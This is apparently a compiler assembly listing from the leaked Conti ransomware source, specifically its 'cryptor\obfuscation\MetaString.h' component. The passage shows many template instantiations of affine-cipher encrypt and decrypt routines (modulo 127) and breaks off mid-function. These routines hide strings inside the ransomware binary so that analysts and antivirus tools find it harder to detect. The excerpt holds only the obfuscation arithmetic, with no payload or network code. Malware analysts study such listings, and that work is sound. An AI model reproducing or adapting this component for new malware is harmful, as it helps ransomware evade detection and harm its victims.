;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 15	 add	 r8d, 21
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 7c 00 00 00	 mov	 ecx, 124		; 0000007cH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 7c	 add	 r8d, 124		; 0000007cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 2d	 sub	 eax, 45			; 0000002dH
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2d	 add	 r8d, 45			; 0000002dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 78 00 00 00	 mov	 ecx, 120		; 00000078H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 78	 add	 r8d, 120		; 00000078H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 37	 sub	 eax, 55			; 00000037H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 37	 add	 r8d, 55			; 00000037H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 3c 00 00 00	 mov	 ecx, 60			; 0000003cH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 3c	 add	 r8d, 60			; 0000003cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
